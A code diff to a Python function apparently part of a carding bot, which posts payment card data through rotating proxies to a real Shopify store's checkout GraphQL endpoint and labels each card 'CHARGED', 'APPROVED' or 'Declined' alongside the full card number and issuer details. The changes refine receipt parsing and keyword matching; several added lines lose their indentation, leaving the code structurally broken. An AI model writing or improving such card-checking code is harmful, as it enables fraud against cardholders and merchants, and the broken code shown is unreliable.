@@ -610,20 +610,53 @@ async def sh(card_input: str, proxy_manager):
         }
         elapsed_time = time.time() - start_time
         try:
-            async with r.post(
-                'https://violettefieldthreads.com/checkouts/unstable/graphql',
-                params=params,
-                headers=headers,
-                json=json_data,
-            ) as response:
-                text = await response.text()
-                if "thank" in text.lower():
-                    return ShResult(
-                        f"""𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥
-
+    async with r.post(
+        'https://violettefieldthreads.com/checkouts/unstable/graphql',
+        params=params,
+        headers=headers,
+        json=json_data,
+    ) as response:
+        text = await response.text()
+        
+        # Try to parse JSON response
+        try:
+            data = json.loads(text)
+            
+            # Check for GraphQL errors first
+            if 'errors' in data:
+                error_msg = data['errors'][0].get('message', 'Unknown error')
+                return ShResult(
+                    f"GraphQL error: {error_msg}",
+                    elapsed_time,
+                    proxy_status,
+                    "Declined",
+                    f"{type} - {level} - {brand}",
+                    bank,
+                    country,
+                    flag,
+                    currency,
+                    error_msg
+                )
+            
+            # Check receipt status in the response
+            receipt = data.get('data', {}).get('receipt', {})
+            receipt_type = receipt.get('__typename', '').lower()
+            
+            # Check for processed receipt (successful charge)
+            if 'processedreceipt' in receipt_type:
+                # Extract order details if available
+                order_identity = receipt.get('orderIdentity', {})
+                order_id = order_identity.get('id', 'N/A')
+                token = receipt.get('token', 'N/A')
+                
+                response_msg = f"Order #{order_id} confirmed" if order_id != 'N/A' else "Order confirmed"
+                
+                return ShResult(
+                    f"""𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥
+                    
 [ϟ]𝗖𝗮𝗿𝗱 -» {full_card}
 [ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
-[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Order # confirmed
+[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {response_msg}
 
 [ϟ]𝗜𝗻𝗳𝗼 -» {type} - {level} - {brand} 💳
 [ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
@@ -631,23 +664,25 @@ async def sh(card_input: str, proxy_manager):
 
 [⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f}s
 [⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
-                        elapsed_time, 
-                        proxy_status,
-                        "Charged",
-                        f"{type} - {level} - {brand} 💳",
-                        bank,
-                        country,
-                        flag,
-                        currency,
-                        "Order # confirmed"
-                    )
-                elif "actionrequiredreceipt" in text.lower():
-                    return ShResult(
-                        f"""𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅
+                    elapsed_time, 
+                    proxy_status,
+                    "Charged",
+                    f"{type} - {level} - {brand} 💳",
+                    bank,
+                    country,
+                    flag,
+                    currency,
+                    response_msg
+                )
+            
+            # Check for action required (3DS)
+            elif 'actionrequiredreceipt' in receipt_type:
+                return ShResult(
+                    f"""𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅
 
 [ϟ]𝗖𝗮𝗿𝗱 -» {full_card}
 [ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
-[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» ActionRequired ( 3ds Failed ❌ )
+[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» ActionRequired ( 3ds Required )
 
 [ϟ]𝗜𝗻𝗳𝗼 -» {type} - {level} - {brand} 💳
 [ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
@@ -655,30 +690,146 @@ async def sh(card_input: str, proxy_manager):
 
 [⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f}s
 [⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
-                        elapsed_time, 
-                        proxy_status,
-                        "Approved",
-                        f"{type} - {level} - {brand} 💳",
-                        bank,
-                        country,
-                        flag,
-                        currency,
-                        "ActionRequired (3ds Failed)"
-                    )
+                    elapsed_time, 
+                    proxy_status,
+                    "Approved",
+                    f"{type} - {level} - {brand} 💳",
+                    bank,
+                    country,
+                    flag,
+                    currency,
+                    "ActionRequired (3DS Required)"
+                )
+            
+            # Check for failed receipt
+            elif 'failedreceipt' in receipt_type:
+                error_info = receipt.get('processingError', {})
+                error_code = error_info.get('code', 'unknown')
+                error_msg = error_info.get('messageUntranslated', 'Payment failed')
+                
+                return ShResult(
+                    f"""𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
+
+[ϟ]𝗖𝗮𝗿𝗱 -» {full_card}
+[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
+[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {error_msg}
+
+[ϟ]𝗜𝗻𝗳𝗼 -» {type} - {level} - {brand} 💳
+[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
+[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country}{flag} - {currency}
+
+[⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f}s
+[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
+                    elapsed_time, 
+                    proxy_status,
+                    "Declined",
+                    f"{type} - {level} - {brand} 💳",
+                    bank,
+                    country,
+                    flag,
+                    currency,
+                    error_msg
+                )
+            
+            # Fallback to text analysis if JSON parsing doesn't give clear status
+            elif any(keyword in text.lower() for keyword in ['thank', 'order', 'confirm', 'success', 'processed', 'confirmed', 'completed']):
+                return ShResult(
+                    f"""𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥
+                    
+[ϟ]𝗖𝗮𝗿𝗱 -» {full_card}
+[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
+[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Order Confirmed
+
+[ϟ]𝗜𝗻𝗳𝗼 -» {type} - {level} - {brand} 💳
+[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
+[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country}{flag} - {currency}
+
+[⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f}s
+[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
+                    elapsed_time, 
+                    proxy_status,
+                    "Charged",
+                    f"{type} - {level} - {brand} 💳",
+                    bank,
+                    country,
+                    flag,
+                    currency,
+                    "Order Confirmed"
+                )
+                
+        except json.JSONDecodeError:
+            # If JSON parsing fails, fall back to text analysis
+            pass
+        
+        # Original text-based fallback logic with added "thank" keyword
+        if any(keyword in text.lower() for keyword in ['thank', 'thank you', 'order', 'confirm', 'success', 'processed', 'confirmed', 'completed', 'your order', 'confirmation']):
+            return ShResult(
+                f"""𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥
+                
+[ϟ]𝗖𝗮𝗿𝗱 -» {full_card}
+[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
+[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Order Confirmed
+
+[ϟ]𝗜𝗻𝗳𝗼 -» {type} - {level} - {brand} 💳
+[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
+[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country}{flag} - {currency}
+
+[⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f}s
+[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
+                elapsed_time, 
+                proxy_status,
+                "Charged",
+                f"{type} - {level} - {brand} 💳",
+                bank,
+                country,
+                flag,
+                currency,
+                "Order Confirmed"
+            )
+        elif "actionrequiredreceipt" in text.lower():
+            return ShResult(
+                f"""𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅
+
+[ϟ]𝗖𝗮𝗿𝗱 -» {full_card}
+[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
+[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» ActionRequired ( 3ds Required )
+
+[ϟ]𝗜𝗻𝗳𝗼 -» {type} - {level} - {brand} 💳
+[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
+[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country}{flag} - {currency}
+
+[⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f}s
+[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
+                elapsed_time, 
+                proxy_status,
+                "Approved",
+                f"{type} - {level} - {brand} 💳",
+                bank,
+                country,
+                flag,
+                currency,
+                "ActionRequired (3DS Required)"
+            )
 
             max_retries = 3
-            for _ in range(max_retries):
-                async with r.post(
-                    'https://violettefieldthreads.com/checkouts/unstable/graphql',
-                    params=params,
-                    headers=headers,
-                    json=json_data,
-                ) as final_response:
-                    final_text = await final_response.text()
-                    fff = find_between(final_text, '"code":"', '"')
-                    if "thank" in final_text.lower():
-                        return ShResult(
-                            f"""𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥
+for _ in range(max_retries):
+    async with r.post(
+        'https://violettefieldthreads.com/checkouts/unstable/graphql',
+        params=params,
+        headers=headers,
+        json=json_data,
+    ) as final_response:
+        final_text = await final_response.text()
+        
+        # Try to parse JSON first
+        try:
+            final_data = json.loads(final_text)
+            final_receipt = final_data.get('data', {}).get('receipt', {})
+            final_receipt_type = final_receipt.get('__typename', '').lower()
+            
+            if 'processedreceipt' in final_receipt_type:
+                return ShResult(
+                    f"""𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥
 
 [ϟ]𝗖𝗮𝗿𝗱 -» {full_card}
 [ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
@@ -690,23 +841,23 @@ async def sh(card_input: str, proxy_manager):
 
 [⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f}s
 [⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
-                            elapsed_time, 
-                            proxy_status,
-                            "Charged",
-                            f"{type} - {level} - {brand} 💳",
-                            bank,
-                            country,
-                            flag,
-                            currency,
-                            "Order # confirmed"
-                        )
-                    elif "actionrequiredreceipt" in final_text.lower():
-                        return ShResult(
-                            f"""𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅
+                    elapsed_time, 
+                    proxy_status,
+                    "Charged",
+                    f"{type} - {level} - {brand} 💳",
+                    bank,
+                    country,
+                    flag,
+                    currency,
+                    "Order # confirmed"
+                )
+            elif 'actionrequiredreceipt' in final_receipt_type:
+                return ShResult(
+                    f"""𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅
 
 [ϟ]𝗖𝗮𝗿𝗱 -» {full_card}
-[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1.47$
-[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» ActionRequired ( 3ds Failed ❌ )
+[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
+[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» ActionRequired ( 3ds Required )
 
 [ϟ]𝗜𝗻𝗳𝗼 -» {type} - {level} - {brand} 💳
 [ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
@@ -714,26 +865,27 @@ async def sh(card_input: str, proxy_manager):
 
 [⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f}s
 [⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
-                            elapsed_time, 
-                            proxy_status,
-                            "Approved",
-                            f"{type} - {level} - {brand} 💳",
-                            bank,
-                            country,
-                            flag,
-                            currency,
-                            "ActionRequired (3ds Failed)"
-                        )
-                    elif "processingreceipt" in final_text.lower():
-                        await asyncio.sleep(3)
-                        continue
-                    else:
-                        return ShResult(
-                            f"""𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
+                    elapsed_time, 
+                    proxy_status,
+                    "Approved",
+                    f"{type} - {level} - {brand} 💳",
+                    bank,
+                    country,
+                    flag,
+                    currency,
+                    "ActionRequired (3DS Required)"
+                )
+        except json.JSONDecodeError:
+            pass
+        
+        # Text-based check with "thank" keyword
+        if any(keyword in final_text.lower() for keyword in ['thank', 'thank you', 'order', 'confirm', 'success', 'processed', 'confirmed', 'completed', 'your order', 'confirmation']):
+            return ShResult(
+                f"""𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥
 
 [ϟ]𝗖𝗮𝗿𝗱 -» {full_card}
-[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1.47$
-[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {fff}
+[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
+[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Order # confirmed
 
 [ϟ]𝗜𝗻𝗳𝗼 -» {type} - {level} - {brand} 💳
 [ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
@@ -741,22 +893,51 @@ async def sh(card_input: str, proxy_manager):
 
 [⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f}s
 [⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
-                            elapsed_time, 
-                            proxy_status,
-                            "Declined",
-                            f"{type} - {level} - {brand} 💳",
-                            bank,
-                            country,
-                            flag,
-                            currency,
-                            fff
-                        )
+                elapsed_time, 
+                proxy_status,
+                "Charged",
+                f"{type} - {level} - {brand} 💳",
+                bank,
+                country,
+                flag,
+                currency,
+                "Order # confirmed"
+            )
+        elif "actionrequiredreceipt" in final_text.lower():
+            return ShResult(
+                f"""𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅
+
+[ϟ]𝗖𝗮𝗿𝗱 -» {full_card}
+[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
+[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» ActionRequired ( 3ds Required )
+
+[ϟ]𝗜𝗻𝗳𝗼 -» {type} - {level} - {brand} 💳
+[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
+[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country}{flag} - {currency}
+
+[⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f}s
+[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
+                elapsed_time, 
+                proxy_status,
+                "Approved",
+                f"{type} - {level} - {brand} 💳",
+                bank,
+                country,
+                flag,
+                currency,
+                "ActionRequired (3DS Required)"
+            )
+        elif "processingreceipt" in final_text.lower():
+            await asyncio.sleep(3)
+            continue
+        else:
+            fff = find_between(final_text, '"code":"', '"')
             return ShResult(
                 f"""𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
 
 [ϟ]𝗖𝗮𝗿𝗱 -» {full_card}
 [ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$
-[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Processing Failed!
+[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {fff if fff else 'Payment failed'}
 
 [ϟ]𝗜𝗻𝗳𝗼 -» {type} - {level} - {brand} 💳
 [ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bank} 🏛
@@ -772,7 +953,7 @@ async def sh(card_input: str, proxy_manager):
                 country,
                 flag,
                 currency,
-                "Processing Failed"
+                fff if fff else 'Payment failed'
             )
         except asyncio.TimeoutError:
             proxy_manager.mark_bad(proxy)
